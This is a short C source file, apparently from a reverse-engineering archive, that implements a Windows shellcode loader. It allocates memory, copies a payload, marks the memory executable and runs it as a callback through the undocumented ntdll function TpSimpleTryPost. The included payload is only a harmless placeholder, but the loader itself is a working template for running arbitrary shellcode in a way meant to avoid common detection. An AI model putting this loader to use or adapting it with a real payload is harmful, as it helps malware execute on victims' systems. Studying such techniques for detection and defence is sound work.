/*
    Shellcode Loader
    Archive of Reversing.ID

    Abusing windows API to run shellcode as callback.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  TpSimpleTryPost
*/

#include <windows.h>
#include <stdint.h>

/* ========= some definition ========= */

/* ========= function signatures ========= */
typedef NTSTATUS TpSimpleTryPost_t (
    PTP_SIMPLE_CALLBACK     callback,
    PVOID                   args,
    PTP_CALLBACK_ENVIRON    environ
);
typedef TpSimpleTryPost_t FAR * pTpSimpleTryPost;


int main ()
{
    void *  runtime;
    BOOL    retval;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    NTSTATUS    status;
    HMODULE     ntdll;
    
    // function pointer to internal API
    pTpSimpleTryPost TpSimpleTryPost;

    // resolve all functions
    ntdll = GetModuleHandle("ntdll.dll");
    TpSimpleTryPost = (pTpSimpleTryPost) GetProcAddress(ntdll, "TpSimpleTryPost");

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        TpSimpleTryPost((PTP_SIMPLE_CALLBACK)runtime, NULL, NULL);

        WaitForSingleObject(GetCurrentProcess(), 1000);
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}